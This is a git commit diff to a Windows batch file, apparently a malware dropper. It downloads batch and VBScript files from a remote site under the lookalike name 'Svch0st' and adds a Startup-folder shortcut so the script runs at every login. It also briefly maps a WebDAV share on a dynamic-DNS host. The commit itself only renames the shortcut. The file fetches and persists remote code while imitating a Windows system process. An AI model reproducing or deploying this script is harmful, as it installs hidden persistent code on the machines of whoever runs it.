4600c9f2c81f9590620339109881ec9636be1359
delta-12 <40147170+delta-12@users.noreply.github.com>
2020-01-19 23:34:11 -0500

    Update Svhstp.bat

--- testing/files/Svhstp.bat
+++ testing/files/Svhstp.bat
@@ -2,6 +2,6 @@ cd %userprofile%\AppData\Local
 powershell wget https://delta-12.github.io/testing/files/Svchost.bat -outfile Svch0st.bat
 powershell wget https://delta-12.github.io/testing/files/Svchost.vbs -outfile Svch0st.vbs
 cd %userprofile%\AppData\Roaming\Microsoft\Windows\"Start Menu"\Programs\Startup
-powershell "$s=(New-Object -COM WScript.Shell).CreateShortcut('Svchost.lnk');$s.TargetPath='%userprofile%\AppData\Local\Svch0st.vbs';$s.Save()"
+powershell "$s=(New-Object -COM WScript.Shell).CreateShortcut('Svch0st.lnk');$s.TargetPath='%userprofile%\AppData\Local\Svch0st.vbs';$s.Save()"
 net use M: \\jajaja.servehttp.com\webdav /persistent:no
 net use M: /delete
